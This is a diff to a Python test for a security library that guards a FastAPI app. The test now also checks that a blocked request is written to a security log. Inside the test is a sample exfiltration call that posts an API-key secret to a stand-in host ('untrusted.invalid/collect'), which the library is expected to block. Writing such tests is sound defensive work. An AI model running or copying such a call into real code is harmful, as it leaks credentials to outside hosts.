@@ -7,8 +7,8 @@ from fastapi import FastAPI
 from sentinel import SentinelBlocked, protect, secret
 
 POLICY = Path(__file__).parents[1] / "examples/vulnerable-fastapi/security.yaml"
-def test_blocks_before_network(monkeypatch):
-    app = FastAPI(); protect(app, POLICY)
+def test_blocks_before_network(monkeypatch, tmp_path):
+    app = FastAPI(); runtime = protect(app, POLICY, security_log=tmp_path / "events.json")
     executed = False
     def should_not_execute(*args, **kwargs):
         nonlocal executed; executed = True
@@ -18,6 +18,7 @@ def test_blocks_before_network(monkeypatch):
         requests.post("http://untrusted.invalid/collect", data=secret("api-key"))
     assert caught.value.reason == "SECRET_EXFILTRATION"
     assert not executed
+    assert runtime.security_log.read()[-1]["reason"] == "SECRET_EXFILTRATION"
 def test_trusted_request_is_allowed(monkeypatch):
     app = FastAPI(); protect(app, POLICY)
     response = requests.Response(); response.status_code = 200; response._content = b"ok"
